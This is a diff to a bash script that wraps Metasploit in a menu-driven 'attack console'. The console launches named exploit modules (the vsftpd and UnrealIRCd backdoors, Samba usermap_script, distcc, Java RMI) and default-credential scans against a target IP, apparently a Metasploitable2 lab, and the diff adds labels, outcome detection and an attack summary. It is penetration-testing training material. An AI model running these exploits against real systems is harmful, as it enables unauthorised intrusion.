@@ -15,18 +15,19 @@ YELLOW='\033[1;33m'
 CYAN='\033[0;36m'
 NC='\033[0m'
 
-# Minimal monochrome whiptail theme
+# Minimal monochrome whiptail theme — active/focused widgets get an
+# inverted white highlight so it's clear what's currently selected
 export NEWT_COLORS='
 root=white,black
 border=white,black
 window=white,black
 shadow=,black
 title=white,black
-button=black,white
-actbutton=white,black
+button=black,cyan
+actbutton=black,white
 checkbox=white,black
 actcheckbox=black,white
-entry=white,black
+entry=black,white
 label=white,black
 listbox=white,black
 actlistbox=black,white
@@ -87,6 +88,7 @@ if [ $? -ne 0 ] || [ -z "$TARGET_IP" ]; then
 fi
 
 LHOST=$(hostname -I | awk '{print $1}')
+ATTACK_LOG=()
 
 # ============================================================
 # STEP 3: Attack menu loop — pick a module, show detail, run,
@@ -114,54 +116,63 @@ while true; do
   case "$CHOICE" in
     1)
       MODULE="exploit/unix/ftp/vsftpd_234_backdoor"
+      LABEL="FTP Backdoor (vsftpd 2.3.4)"
       PORT_INFO="21/tcp (FTP)"
       DESC="The vsftpd 2.3.4 source tarball was trojaned in 2011: sending \":)\" as part of the FTP username opens a root shell listener on port 6200."
       EXPECTED="Root shell via reverse connection, if the backdoor is present and reachable."
       ;;
     2)
       MODULE="exploit/multi/samba/usermap_script"
+      LABEL="Samba usermap_script"
       PORT_INFO="139/445/tcp (Samba)"
       DESC="Samba 3.0.20's 'username map script' config option lets shell metacharacters in the login username reach a shell call, giving remote code execution."
       EXPECTED="Root shell via reverse connection."
       ;;
     3)
       MODULE="exploit/unix/irc/unreal_ircd_3281_backdoor"
+      LABEL="UnrealIRCd Backdoor"
       PORT_INFO="6667/tcp (UnrealIRCd)"
       DESC="The Unreal3.2.8.1 source tarball was trojaned in 2009: any message prefixed with 'AB;' sent to the IRC daemon is executed as a shell command."
       EXPECTED="Shell as the IRC daemon's user."
       ;;
     4)
       MODULE="exploit/unix/misc/distcc_exec"
+      LABEL="distccd Command Execution"
       PORT_INFO="3632/tcp (distccd)"
       DESC="distcc's distributed-compile daemon executes any command sent to it with no authentication when bound in its default/insecure mode."
       EXPECTED="Shell as the low-privilege distcc user."
       ;;
     5)
       MODULE="exploit/multi/misc/java_rmi_server"
+      LABEL="Java RMI Server"
       PORT_INFO="1099/tcp (Java RMI)"
       DESC="An unauthenticated Java RMI registry lets an attacker register a remote object that loads attacker-supplied Java classes, executing arbitrary code."
       EXPECTED="Shell as the service's running user."
       ;;
     6)
       MODULE="auxiliary/scanner/http/tomcat_mgr_login"
+      LABEL="Tomcat Manager login scan"
       PORT_INFO="8180/tcp (Tomcat Manager)"
       DESC="Brute-forces the Tomcat /manager/html login with common default credentials. Valid creds can then be used with tomcat_mgr_deploy to upload a WAR and get code execution (not automated here)."
       EXPECTED="Valid manager credentials printed, if weak/default creds are set."
       ;;
     7)
       MODULE="auxiliary/scanner/postgres/postgres_login"
+      LABEL="PostgreSQL weak credentials"
       PORT_INFO="5432/tcp (PostgreSQL)"
       DESC="Scans for default/weak PostgreSQL credentials (Metasploitable2 ships postgres/postgres)."
       EXPECTED="Valid database credentials printed, if weak creds are set."
       ;;
     8)
       MODULE="auxiliary/scanner/mysql/mysql_login"
+      LABEL="MySQL no root password"
       PORT_INFO="3306/tcp (MySQL)"
       DESC="Metasploitable2's MySQL root account has an empty password, so any client can authenticate as root without credentials."
       EXPECTED="Confirms unauthenticated root login to MySQL."
       ;;
     9)
       MODULE=""
+      LABEL="Manual msfconsole session"
       PORT_INFO="-"
       DESC="Drops into a normal msfconsole session with LHOST/RHOSTS pre-set. Use any module manually."
       EXPECTED="Full manual control — you exit whenever you like."
@@ -193,11 +204,40 @@ while true; do
   echo -e "\n${CYAN}[INFO] Attacker IP (LHOST): ${LHOST}${NC}"
   echo -e "${CYAN}[INFO] Target IP   (RHOSTS): ${TARGET_IP}${NC}"
 
-  msfconsole -q -x "$FULL_CMD"
+  TS=$(date '+%Y-%m-%d %H:%M:%S')
+
+  if [ -n "$MODULE" ]; then
+    # Capture output (while still showing it live) to summarize the outcome
+    RUN_OUTPUT=$(msfconsole -q -x "$FULL_CMD" | tee /dev/tty)
+    if echo "$RUN_OUTPUT" | grep -qiE "session [0-9]+ opened"; then
+      STATUS="Session opened"
+    elif echo "$RUN_OUTPUT" | grep -qi "login successful"; then
+      STATUS="Valid credentials found"
+    elif echo "$RUN_OUTPUT" | grep -qiE "unreachable|connection refused|timed out"; then
+      STATUS="Failed - target unreachable"
+    elif echo "$RUN_OUTPUT" | grep -qi "no session was created"; then
+      STATUS="Completed - no session created"
+    else
+      STATUS="Completed - see output above"
+    fi
+    ATTACK_LOG+=("$TS | $LABEL | $TARGET_IP | $STATUS")
+  else
+    msfconsole -q -x "$FULL_CMD"
+    ATTACK_LOG+=("$TS | $LABEL | $TARGET_IP | Manual session (user-driven)")
+  fi
 
   if ! whiptail --title "Metasploit Attack Console" --yesno "Run another module against $TARGET_IP?" 8 60; then
     break
   fi
 done
 
+echo -e "\n${CYAN}================ Attack Summary ================${NC}"
+if [ ${#ATTACK_LOG[@]} -eq 0 ]; then
+  echo "  No attacks were run this session."
+else
+  for entry in "${ATTACK_LOG[@]}"; do
+    echo "  $entry"
+  done
+fi
+echo -e "${CYAN}==================================================${NC}"
 echo -e "\n${GREEN}Session ended.${NC}"
